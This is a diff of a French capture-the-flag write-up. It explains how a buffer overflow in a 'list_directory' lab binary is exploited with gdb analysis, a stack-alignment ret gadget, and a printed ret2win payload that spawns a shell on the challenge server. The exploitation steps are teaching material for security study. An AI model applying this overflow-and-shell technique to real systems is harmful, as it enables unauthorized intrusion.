@@ -10,7 +10,7 @@ http://internetcest.fun:13339
 
 [Cet executable](./list_directory) est fournis. Essayons le :
 
-```console
+```bash
 $ ./list_directory 
 Enter the path you want to list: 
 test
@@ -56,11 +56,8 @@ undefined8 main(undefined4 param_1,undefined8 param_2)
   vuln(pcVar1);
   return 0;
 }
-```
 
-```C
 void vuln(void *param_1)
-
 {
   undefined6 local_20;
   undefined2 uStack_1a;
@@ -75,11 +72,8 @@ void vuln(void *param_1)
   puts("Not implemented yet! ");
   return;
 }
-```
 
-```C
 void win(void)
-
 {
   puts("Bravo !");
   system("/bin/sh");
@@ -107,16 +101,13 @@ memcpy(&local_20,param_1,(long)PATH_LEN);
 
 Il faut donc exploiter le buffer overflow pour rediriger le programme vers la fonction win(), après vuln().  
   
-Le code étant extrêmement obfusqué, utiliser gdb pour voir ce qu'il se passe dans la mémoire au lieu d'essayer de le comprendre.
+Le code étant extrêmement obfusqué, utilisons gdb pour voir ce qu'il se passe dans la mémoire au lieu d'essayer de le comprendre.
 
 # Payload
 
 On ouvre le programme dans gdb, place des breakpoints aux points clés, et observe si l'on voit la valeur entrée dans la stack :
 
-```console
-$ gdb list_directory -q
-Reading symbols from list_directory...
-(No debugging symbols found in list_directory)
+```gdb
 (gdb) disas main
 Dump of assembler code for function main:
    0x000000000040121b <+0>:	push   %rbp
@@ -304,7 +295,7 @@ gs             0x0                 0
 
 On voit que l'entrée saisie par l'utilisateur n'est pas modifié avant d'être envoyé à vuln(), et que la fonction vuln() le copie directement dans la stack. En inspectant le registre pour trouver l'adresse du rbp, on obtient un payload permettant de modifier l'adresse vers laquelle vuln() va retourner :
 
-```console
+```gdb
 (gdb) i func win
 All functions matching regular expression "win":
 
@@ -369,7 +360,7 @@ Program received signal SIGSEGV, Segmentation fault.
 
 On est bien au message de succès, mais on tombe ensuite sur un SIGSEV. Allons voir où le programme s'arrête exactement : 
 
-```console
+```gdb
 (gdb) 
 
 Program received signal SIGSEGV, Segmentation fault.
@@ -381,7 +372,7 @@ Program received signal SIGSEGV, Segmentation fault.
 
 Le programme s'arrête sur une instruction movaps, on comprend d'après [ce blog](https://ropemporium.com/guide.html#Common-pitfalls) que la stack n'est pas aligné correctement en conséquence de nos injections. D'après ce même blog il faudrait rajouter une instruction ret pour la réaligner. Essayons de call à nouveau l'instruction ret dans notre payload, avant d'appeler la fonction win :
 
-```console
+```gdb
 (gdb) disas vuln
 Dump of assembler code for function vuln:
    0x00000000004011b6 <+0>:	push   %rbp
@@ -462,7 +453,7 @@ End of assembler dump.
 
 Le shell c'est bien lancé, puis refermé. Essayons sur l'executable :
 
-```console
+```bash
 $ (python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32+b"\x1a\x12\x40\x00"+b"\x00"*4+b"\x76\x11\x40\x00"+b"\x00"*4)' ; tee) | ./list_directory 
 Enter the path you want to list: 
 Not implemented yet! 
@@ -478,7 +469,7 @@ Le shell c'est bien lancé, le payload final est donc `"\x41"*32+"\x1a\x12\x40\x
 
 De la même manière que le chall précedent, on utilise [ce script python](./exploit.py) pour se connecter, envoyer le payload, et interagir avec le shell.
 
-```console
+```bash
 $ python3 ./exploit.py
 b'Enter the path you want to list: \nNot implemented yet! \nBravo !\n'
 whoami
